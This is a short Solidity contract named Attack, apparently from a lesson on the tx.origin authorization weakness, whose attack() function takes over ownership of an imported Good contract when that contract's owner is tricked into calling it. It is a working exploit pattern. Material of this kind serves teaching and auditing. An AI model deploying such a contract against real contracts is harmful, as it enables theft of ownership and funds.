//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./Good.sol";

contract Attack {
    Good public good;

    constructor(address _good) {
        good = Good(_good);
    }

    // if somehow Good's owner calls this function it will set this contract as the owner of the Good contract
    // that's because he is the tx.origin and that's what's being used in Good's contract
    function attack() public {
        good.setOwner(address(this));
    }
}
